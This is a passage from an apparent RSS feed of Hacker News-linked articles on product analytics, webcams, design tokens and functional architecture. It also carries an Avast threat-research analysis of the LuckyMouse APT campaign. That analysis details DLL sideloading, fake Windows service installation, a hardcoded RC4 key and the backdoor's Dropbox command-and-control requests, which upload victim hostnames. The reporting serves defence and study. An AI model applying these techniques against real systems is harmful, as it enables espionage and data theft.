doesn't. Product analytics also tell you if people are actually using your product: you choose a 'North Star' metric that guides your company in the right direction and tells you if your efforts are bearing fruit.</p><p>Then, the company moves on to the next phase. The road ahead becomes clear, product development becomes more linear, and the product itself stabilizes. It's all about doing more of the same thing. You start to build things that scale. It's the beginning of the optimization phase.</p><p>Your roadmap is clearer, traffic grows, the product becomes more and more complex and dynamic. A variety of variables start to influence the way your product performs: marketing, sales, product development, customer success, support, business development, partnerships, promotions, etc.</p><p>You realize all of a sudden the data that helped you find your feet is overwhelming you. You're swimming in data from more and more sources about how your user-base is growing, how people are interacting with your brand and your product. As your data stack grows larger and your dashboards multiply, you start getting the feeling that you’re missing something vital.</p><p>In this fast-growing deluge of data, a missing piece comes into play: product observability. Product observability keeps track of user behavior all the time, at the finest level of granularity to the highest level of abstraction.</p><p>There are many reasons why people change their behavior. Adjustments to the product, holidays, a new offering from a competitor, changing habits, etc. Product observability is capable of spotting those changes and flagging the issue as a problem or, perhaps, an opportunity. Product observability analyzes all your data all the time, noticing the finest-grained changes to overarching trends.</p><p>Product observability is proactive. Product observability informs you that something needs your attention due to a change in user behavior. Or, you learn that what you're doing is working really well and you need to double-down on your efforts. You get details on the origin of the changes and the impact it could have on your business.</p><p>Once you've reached the market with your product, you already know that you're creating value for people. But now the question becomes how much value can you capture? And for how many users? Product observability optimizes your product's ability to create value by automatically giving you feedback on what you need to fix and keep on doing.</p><p>If you’re interested in trying proactive analytics, sign up for Lantern's early access program <a href="https://lantern.so/">here</a>.</p></div></div><div><div><div><p>Subscribe to our newsletter</p><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><h4>About</h4><p>Ideas and advice on how to leverage analytics in modern product teams.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.lantern.so/blog/from-product-analytics-to-product-observability</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504778</guid>
            <pubDate>Tue, 22 Dec 2020 10:17:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why can’t you buy a good webcam?]]>
            </title>
            <description>
<![CDATA[
Score 774 | Comments 761 (<a href="https://news.ycombinator.com/item?id=25504771">thread link</a>) | @murkt
<br/>
December 22, 2020 | https://vsevolod.net/good-webcams/ | <a href="https://web.archive.org/web/*/https://vsevolod.net/good-webcams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <p>Some people are not satisfied with a webcam from their notebook or an old webcam
they bought many years ago.</p>
<p>My brother decided he wants to try streaming. Some people can just do a thing
and other people want to research all the bits and pieces beforehand. Our chat
history is comparable in length to all my other chats combined, so I learned a
lot of it as well. The craft is full with small details and inconveniences.</p>
<p>He found that there are basically no good webcams. A lot of the time an image
quality is meh, and the rare presence of 4k is usually not better than 1080p,
because resolution is not quality. Some camera apparently does upscaling from
1080p to 4k in its driver, indicated by poor quality and high CPU load. He also
has a really good camera, Fujifilm X-T1. It can't be used as a webcam when
connected to a USB port. Usually it's possible to buy an HDMI-to-USB converter,
but his camera can't output a live stream into HDMI, only a recorded video.</p>
<p>So we had an idea — maybe it is possible to create a good webcam
ourselves. Would anybody care? Well, it’s almost 2021 now, streaming is still on
the rise, pandemic is going strong and video meetings are everywhere. People are
willing to spend some money, as indicated by countless videos on YouTube
regarding the problem.</p>
<p>Let’s start with defining what is a good webcam.</p>
<p>A good webcam, in my opinion, is a device that provides a decent sound quality,
at least on par with recent MacBooks, and an image quality on par with top
smartphones, such as iPhone 11/12, Huawei P40 Pro, etc. As smartphones have a
good image quality, then we could probably manufacture a webcam from smartphone
parts that are cheap and easily available. How hard can it be?</p>
<p>If you’ve read at least a couple of articles on the topic of video production,
you will know that to make quality content from the technical standpoint you
need three things, in that particular order:</p>
<ol>
<li>Sound</li>
<li>Light</li>
<li>Video quality</li>
</ol>
<p>Let's discuss these properties and later how to manufacture it.</p>
<h3 id="sound">Sound<a href="#sound" aria-label="Anchor link for: sound">🔗</a></h3>
<p>If you have a recent MacBook, it provides a decent sound quality with its
three-mic array. I haven't researched it and don’t know much about other
notebooks' audio quality. If you have a desktop PC, you have to have some
external mic anyway.</p>
<p>If the web camera has shitty audio quality, you’ll have to buy additional
gear. When I researched the topic, one of the recently released webcams
(available from October 2020) with RRP of $180 was producing a sound as if a
person sits in a big plastic barrel with a closed lid. Their voice was very
muffled with lots of resonant rattles. That level of quality wasn’t acceptable
10 years ago, how this piece of gear could have been produced in 2020 escapes my
understanding.</p>
<p>There are many good enough USB mics for $50+, you also can buy a great XLR
microphone for $100, but then you’ll need an external sound card with phantom
power supply. A decent one can easily cost you $200.</p>
<p>With almost any of these options you’ll have to install and configure some
software that will provide sound level compression, noise suppression (because
your notebook fans are spinning like hell) and won’t produce clicks in the
process.</p>
<p>I would like my webcam to do this by itself, no rattling, minimized echo, etc.</p>
<h3 id="light">Light<a href="#light" aria-label="Anchor link for: light">🔗</a></h3>
<p>A lot of what makes a picture great comes from lighting the scene in a correct way.</p>
<p>The simplest thing is to sit in a room so the window is in front of you and the
Sun isn’t shining into a lens from behind your shoulder.</p>
<p>Webcam cannot provide decent lighting capabilities by itself, so I won’t spend
much time here. There is a <a href="https://www.razer.com/streaming-cameras/razer-kiyo/RZ19-02320100-R3M1">webcam by
Razer</a>
with a built-in LED circle, but it’s necessarily small, always shines from a
webcam direction and is mostly a gimmick.</p>
<p>We can rely somewhat on the good sensor here. If it provides good dynamic range,
HDR capabilities and good low-light performance, then a patch of sunlight on the
wall won't turn everything else black, or a poorly lit room won't turn into a
gray noisy picture with a bleak silhouette.</p>
<h3 id="image-quality">Image quality<a href="#image-quality" aria-label="Anchor link for: image-quality">🔗</a></h3>
<p>It’s impossible to get a good lens and image sensor into a notebook lid, because
lids are very thin. They’re often something like 4 mm thick all together, and
there is no escaping physics. Of course, it's possible to put a webcam into a
thick part below the lid, but then it'll be useful for expressing anger at our
colleagues with wide-open nostrils and not much else.</p>
<p>Maybe some crazy engineer in the future will develop an array of small sensors
with an array of tiny lenses and somehow combine all that into a good image
quality, but we don't have this tech yet. Any smartphone with a good camera has
that camera with an ugly protruding lens as a thickest part of the phone.</p>
<p>So, if you want something better than a notebook's webcam, you can get some
Logitech webcam with an image quality going back to 2012. It’s still better than
a laptop, but nowhere close to current smartphones.</p>
<p>What if you want better still? The next option is to install an app on the phone
and use it as a webcam. This gives a very good image quality, but it’s very
inconvenient and in some applications doesn’t work at all. For some reason it
isn’t always presented in applications as an option when choosing a video
source.</p>
<p>I don’t want to constantly attach, detach, charge my phone and tune the position of
a small tripod. What’s the next option?</p>
<p>The next option is to just buy a mirrorless photo-camera with a big fat 4/3” or
even APS-C sensor. It will cost $500+ for a new one (you can buy used for
cheaper). You will also need some gear to hold the camera in place, as it won’t
just rest on the top of the screen like a regular webcam. You also need an
HDMI-to-USB video grabber, and you need to be sure that the camera you buy can
output full resolution live onto that HDMI. Also make sure that it's possible to
turn off all on-screen info like <code>1/100s F3.5 ISO 800</code>, which is useful when
you're shooting photos and videos through viewfinder, but not so much when
you're in a video meeting. This feature is called "Clean HDMI".</p>
<p>Of course, you will have a lot of control over the whole stuff — set a
diaphragm, get good bokeh, set ISO, set white balance, etc. Do you actually need
it? Well, some of you do, and a lot of you do not. I learned all that stuff when
I was 16, but now I’m pretty happy with how my phone chooses everything for me
and just does great photos.</p>
<p>All that sounds pretty involved, isn’t it? It is a lot of time to research what
you need, how to set it all up, and a lot of money too.</p>
<h3 id="manufacturing-it">Manufacturing it<a href="#manufacturing-it" aria-label="Anchor link for: manufacturing-it">🔗</a></h3>
<p>So there is a market gap between so-so webcams for $100-200 and a full-blown
setup with a mirrorless camera, an external mic and lighting panels that will
cost almost a grand or two, if you're so inclined.</p>
<p>I thought that it is a good idea to create an "upmarket" webcam for $250-300
that will provide good audio and video quality, on par with current smartphones,
actually using the same parts. As smartphones are made in tens of millions, all
relevant parts should be cheap and easily obtainable.</p>
<p>I quickly contacted some people who could help me do the project — firmware
engineer, electric engineer and a company that does mechanical design.</p>
<p>What features are needed for a good webcam for streamers and video meetings?
Audio: good parts (mics and ADC), good mechanical design and assembly (so
nothing would rattle), and some post-processing. We certainly want some
beam-forming capabilities to be able to focus on the person in front of the
webcam, so we will need more than one microphone, maybe up to 4. These parts are
easy to obtain, there are many in stock, it's not a problem.</p>
<p>Even if I think that 4k is not needed, I’m pretty sure it’s really a requirement
to have in an upmarket webcam, as it will be really hard to sell a pricey webcam
that can only do 1080p.</p>
<p>Also would be very nice to have some neural network inference on the chip, so we
can run some AI stuff directly on the webcam without bothering a user’s computer
that can be busy with other things.</p>
<p>I easily found a three-piece assembly for the iPhone 11 Pro for fifty bucks,
two-piece from a Huawei P40 Pro for twenty five and a one-piece from P40 Lite for
ten dollars. That’s with a lens, and bought in retail. Does it mean it costs
peanuts (less than $5 for a sensor) to buy in bulk to produce my own webcam?
Well... Maybe. I can’t just go and buy a couple thousands of these sensors. I’m
pretty sure I can buy a couple thousands of replacement parts for phones, but
sensors themselves are not sold freely. It's easy to buy some "random" sensor
that was around for years and most certainly has "meh" quality by today's
standards, but we need a good one, with good dynamic range, HDR capabilities and
low-light performance.</p>
<p>I wrote to several vendors asking them what are the prices and conditions, and
basically their answer is either silence or “we’ll sell it if you will buy
hundreds of thousands per year”.</p>
<p>I've found suitable System-on-Chips, and it's the same — if we want to have
hardware 4k encoder, it's either "sorry, it was a demo part and we don't do it",
or "we have limited support capabilities, so we can only sell if you will buy
hundreds of thousands, maybe you want some SoMs from our partners?". It is
actually possible to buy System-on-Modules even in very small quantities, but
it's going to be pretty expensive and will be good for a prototype, but for
production it will blow past our budget. System-on-Module will cost almost the
same as the web camera itself.</p>
<p>Oh, and a lead time (from order to shipment) is systematically 16+ weeks. It
means they have no stock and will place an order at semiconductor foundry, have
it produced, packaged and sent to customer. Swiftly.</p>
<p>It means I cannot just build five hundred webcams, see how good are they selling
and build a couple thousand, and so on.</p>
<p>There is also a plastic injection step that requires upfront investment to
manufacture molds, and of course design and engineering costs. All combined it
was tens of thousands …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vsevolod.net/good-webcams/">https://vsevolod.net/good-webcams/</a></em></p>]]>
            </description>
            <link>https://vsevolod.net/good-webcams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504771</guid>
            <pubDate>Tue, 22 Dec 2020 10:16:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where to Start with Design Tokens]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25504704">thread link</a>) | @sanctioned
<br/>
December 22, 2020 | https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner | <a href="https://web.archive.org/web/*/https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>If you’ve been researching design systems, you’ve probably come across the term “design tokens.” (If you haven’t, no worries! You can read about them <a href="https://maecapozzi.com/design-tokens">here</a>.) Even if you’ve heard the term, you might not really understand what they are or where to start.</p>
<p><strong>Design tokens are an approach to storing style attributes like color, typography, and spacing in a pre-determined structure. They are an alternative to directly hard-coding style data that allow designers and developers to build consistent, pleasing layouts, quickly accomplish redesigns, and add a theming layer to their applications.</strong></p>
<p>In my opinion, design tokens are a great way to dip your toes into the world of design systems. I like to think of a design system as a having <a href="https://maecapozzi.com/layers-of-abstraction-in-design-systems">5 layers to it</a>. The smallest building block of that system (or the first layer) is design tokens.</p>
<p>Usually when designers and developers start work on an app, they don’t create a centralized and structured way to organize style data like colors and fonts. This is totally fine for few years, but eventually the team runs into one of the following issues:</p>
<ul>
<li>Marketing wants to redesign the site, but hard-coded colors across design files and codebase are too difficult to keep track of or change
<br></li>
<li>The team wants to add a feature like dark mode, but realizes it’s really difficult without centralized style data
<br></li>
<li>The team wants to start supporting multiple applications without building each one entirely from scratch</li>
</ul>
<p>So once you find yourself in this situation, what do you do?</p>
<h2>1. Decide to invest in design tokens</h2>
<p>The first step is recognizing that design tokens are a great tool for addressing the three situations listed above. At this point, you’ll need to encourage your team to invest in researching and implementing design tokens.</p>
<h2>2. Educate and socialize</h2>
<p>It’s more than likely that some of your teammates will never have heard of design tokens. You’ll need to begin to educate them on the value of the tool, and encourage them to do their own research. You can use <a href="https://theme-ui.com/demo" target="_blank" rel="nofollow noopener noreferrer">Theme UI’s demo</a> to help make your case, or you can create your own proof-of-concept.</p>
<h2>3. Choose how you’ll implement your tokens</h2>
<p>You have a couple of options for how to implement your tokens. A lot of teams choose to implement their own structure and naming scheme. This approach prevents your team from having to depend on an external library. The key is to make sure that your tokens are named really generically! Take a look at examples from companies like Salesforce to get ideas for how to structure your tokens. I write about this topic in more depth <a href="https://maecapozzi.com/design-tokens">here</a> if you are interested.</p>
<p>You also have the option to use a third-party library like <a href="https://theme-ui.com/home" target="_blank" rel="nofollow noopener noreferrer">Theme UI</a>. Theme UI lets you implement your tokens according to their <a href="https://theme-ui.com/theme-spec" target="_blank" rel="nofollow noopener noreferrer">Theme Specification</a> and offers you some helpful syntactic sugar like their <code>sx</code> prop and <code>variants</code> key to make using your tokens easier. Even if the library isn’t for you, you can use the Theme Specification as inspiration.</p>
<h2>4. Implement the tokens</h2>
<p>At this point, you’ll work with designers on the team to agree on naming and structure for the tokens, and you’ll create an object with that contains your structured style data. The final step is to configure the components in your application to read from the tokens instead of from hardcoded values.</p>
<p>So if your tokens look like this:</p>
<div data-language="js"><pre><code><span>const</span> theme <span>=</span> <span>{</span>
  colors<span>:</span> <span>{</span>
    primary<span>:</span> <span>"pink"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span></code></pre></div>
<p>Your components would no longer look like this:</p>
<div data-language="jsx"><pre><code><span>const</span> Nav <span>=</span> <span>styled</span><span>(</span><span>"nav"</span><span>)</span><span><span>`</span><span>
  color: pink;
</span><span>`</span></span><span>;</span></code></pre></div>
<p>They would instead read from the theme object:</p>
<div data-language="jsx"><pre><code><span>const</span> Nav <span>=</span> <span>styled</span><span>(</span><span>"nav"</span><span>)</span><span><span>`</span><span>
  color: </span><span><span>${</span><span>(</span><span>props</span><span>)</span> <span>=&gt;</span> props<span>.</span>theme<span>.</span>colors<span>.</span>primary<span>}</span></span><span>;
</span><span>`</span></span><span>;</span></code></pre></div>
<p>Now, if you change the values of your tokens:</p>
<div data-language="js"><pre><code><span>const</span> theme <span>=</span> <span>{</span>
  colors<span>:</span> <span>{</span>
    primary<span>:</span> <span>"green"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span></code></pre></div>
<p>You no longer need to update the styles in your component.</p>
<hr>
<p>Are you researching design tokens for something you’re building? What are you stuck on? I’d love to hear from you. You can reach me on <a href="https://twitter.com/MCapoz" target="_blank" rel="nofollow noopener noreferrer">Twitter</a> or by responding to any of my newsletter messages. (Seriously, I really want to hear from you.)</p></div></div></div>]]>
            </description>
            <link>https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504704</guid>
            <pubDate>Tue, 22 Dec 2020 10:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designer as Writer]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25504677">thread link</a>) | @omarchowdhury
<br/>
December 22, 2020 | https://stasaki.com/designer-as-writer/ | <a href="https://web.archive.org/web/*/https://stasaki.com/designer-as-writer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://stasaki.com/designer-as-writer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504677</guid>
            <pubDate>Tue, 22 Dec 2020 10:02:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apt Group Targeting Governmental Agencies in East Asia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504490">thread link</a>) | @realpanzer
<br/>
December 22, 2020 | https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/ | <a href="https://web.archive.org/web/*/https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2386">

                    
                    
                    
                    <div>
                        




<p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p>



<p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p>



<p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p>



<p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p>







<p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<span><em>IntgStat.exe</em></span>). This is a legitimate application that loads a DLL <span><em>pcalocalresloader.dll</em></span>. By sideloading their own version <span><em>pcalocalresloader.dll</em></span>, they load HyperBro RAT from a compressed and encrypted file<em> <span>thumbs.db</span></em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>].</p>



<p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em><span>thinprobe.exe</span></em> that loads <em><span>thinhostprobedll.dll</span></em>. This DLL was then used to sideload <em><span>thumb.db</span></em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p>







<p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p>



<p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p>



<p>XXXXXX_update.exe&nbsp;</p>



<p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p>



<p>This archive drops three already familiar files – Symantec’s <em><span>thinprobe.exe</span></em>, malicious <em><span>thinhostprobedll.dll</span></em>, and <em><span>thumb.db</span></em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em><span>thumb.db</span></em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p>



<div><figure><img src="https://lh3.googleusercontent.com/HI4k00UGHM0aHxi1kmzTStkWcM_Yz5mVSnueCoYZRmCFVx7spfjtuWgjdCWgca5-kbEVBWF7PmFvwuB-LXiOiP2Lc7ycLQvxldd3bAjdbL2iqaoaNirYkA32iWkpbyGMUSeONrKA" alt=""><figcaption>Figure 1: Overview of infection vector</figcaption></figure></div>











<p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p>



<ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul>



<p>In detail, we found the following tools:</p>



<h2>StartServiceTool</h2>



<p>This tool installs <em><span>wcm.dll</span></em> into <em><span>%WINDIR%\system32</span></em>, a registry record</p>



<p><span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</span></p>



<p>is created with the following values:</p>



<p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p>



<p>DisplayName: Windows Connections Manager</p>



<p>ServiceDll: <span>C:\Windows\system32\wcm.dll</span>.</p>



<p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/" target="_blank" rel="noreferrer noopener">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p>



<p>The final payload DLL is written in GO and contains a single export named “<span>Interface</span>“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “<span>0000111122223333</span>“. The DLL additionally contains a default API key which appears to be for the authors test account.</p>



<p>Initially, it tries do download a file from Dropbox via the HTTP API:</p>



<p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p>



<p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p>



<p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br><span>User-Agent: Go-http-client/1.1<br></span>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p>



<p><span>%currentDate% %currentTime%##%hostname%</span></p>



<p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p>



<div><figure><img src="https://lh6.googleusercontent.com/TWjSJB0IAQsj6KfXfB2FZKxILGcmI7Kpj85DqivileheKEVnpPEVb_L1R6rRnXnAF3RYHwMOBSdi95l0tty4dRncJ-mbTxQgfihvLdhc_7rdJILmNp4-dkWc4tWfnmnWlsRFh2vu" alt=""><figcaption>Figure 2: Overview of detailed execution flow</figcaption></figure></div>



<h2>ServiceInstaller</h2>



<p>We assume that this installer is intended to be executed by one of the aforementioned backdoors as it requires command-line parameters for its successful execution:</p>


<figure>
<table>
<tbody>
<tr>
<td>Switch</td>
<td>Argument</td>
</tr>
<tr>
<td>-i&nbsp;</td>
<td>path of DLL to install as a service</td>
</tr>
<tr>
<td>-u</td>
<td>Uninstall a specific service name</td>
</tr>
</tbody>
</table>
</figure>


<p>At first, security descriptors of both <em><span>%windir%\system32\</span> </em>and <span><em>%windir%\system32\drivers\ </em></span>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <span><em>%windir%\system32\</em> </span>under a randomly generated name (4 alphanumeric characters).</p>



<p>Depending on whether a service named <span><em>DFS Replication</em> </span>already exists in&nbsp;</p>



<p><span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs</span>,</p>



<p>a new service called <span><em>DFS Replication </em></span>(if it does not exist) or <span><em>IAS Jet Database Access Service %number%</em></span> is created. More specifically, its parameters are:</p>



<p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”<br></em><span>DisplayName: <span>DFS Replication/IAS Jet Database Access Service %number%</span><br></span><span>ServiceDll: <span>C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll</span>.<br></span><span>Tag: 0<br></span><span>Security: 0</span></p>



<h2>ShellCodeExecutor</h2>



<p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p>



<div><figure><img loading="lazy" src="https://lh4.googleusercontent.com/z8TcUKts9HbflaUytjH9SwOBtQsbKXwk6wpUAyufIG3lVmXKqmGjEhpZD_mN5IK_3q1BgzKSBHoZXbt5KXLW_vnjMykhHWntFoCKFOXEOTrghI3s_2b9TCINQqvILHrOZZbGJVA-" alt="" width="766" height="660"><figcaption>Figure 3: Decoding algorithm and executing decoded payload in allocated memory</figcaption></figure></div>



<p>While we weren’t able to reconstruct which …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/">https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/</a></em></p>]]>
            </description>
            <link>https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504490</guid>
            <pubDate>Tue, 22 Dec 2020 09:26:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Functional Architecture Demo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504355">thread link</a>) | @simendsjo
<br/>
December 22, 2020 | https://functional.christmas/2020/22 | <a href="https://web.archive.org/web/*/https://functional.christmas/2020/22">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section>
<p>In this post, I'm going to show the design of a functional program which
solved a difficult problem while being easy to get right and performant.
By avoiding mutation, we were also able to implement "time-travel" to
look how an action would affect the future, easy rollbacks and stale
data detection.</p>
<p>In OOP, there are often deep call-stacks, which I consider a smell
itself, and mutation of state and side-effects often happen at a deep
level. When constructing an application which should be mostly pure with
immutable data, we have to push the side-effects up the call-stack to
the outer boundary. This means that we need to return to the caller
rather than keep diving deeper in the call-stack.</p>
<p>To recap some terminology:</p>
<p>pure<br>
Given the same arguments, it returns the same result. And it has no
effect (other than generating heat) on the outside world. This means no
visible mutation, and no visible side-effects.</p>
<p>immutable<br>
Once a value is set, it cannot be changed. "Mutation" is done by
constructing a new copy rather than modifying in place.</p>
<p>side-effect<br>
A modification to state outside the local environment.</p>
<p>There are some key parts in the architecture I'm demoing here:</p>
<p>State<br>
A record containing all state in the application</p>
<p>Operation<br>
A small language of verbs which describes changes to <code>State</code></p>
<p>ApplicationEvent<br>
Some external event which should trigger changes to our state</p>
<p>Handler<br>
A function which maps from an <code>ApplicationEvent</code> to an <code>Operation</code></p>
<p>You don't need an event driven application to take advantage of the
architecture in this post. Using just immutable state with pure
functions to change the state, will still yield most of the benefits.
Having events and a custom language might be a nice addition, or it
might be over-engineering.</p>
<p>Given the above parts, the flow of the application is then:</p>
<ul>
<li>Something triggers an <code>ApplicationEvent</code></li>
<li><code>Handlers</code> translates to <code>Operations</code></li>
<li>We run each <code>Operation</code> on the <code>State</code>, producing an updated <code>State</code></li>
<li>We use the new state for fun and profit</li>
</ul>
<p>When the new state is produced, we can act on the result by interpreting
the changes. We might validate the changes. We might save to the
database. We might detect stale data by rerunning the application. We
might use it for transactions. Our production implementation does all
this, not just without any side-effects or mutation, but <strong>because</strong>
there are no side-effects or mutations. We can safely rerun things,
throw away things, copy, interpret results, and there are never a chance
of introducing an error outside of our changes – Changes in one place
can never affect something else.</p>

<p>We'll go through the key parts of our <a href="https://github.com/simendsjo/functional-christmas-2020_functional-architecture-demo/blob/main/Small.fs">Small</a> demo.
More/different comments are in the actual source file, so I encourage
you to look there as well.</p>
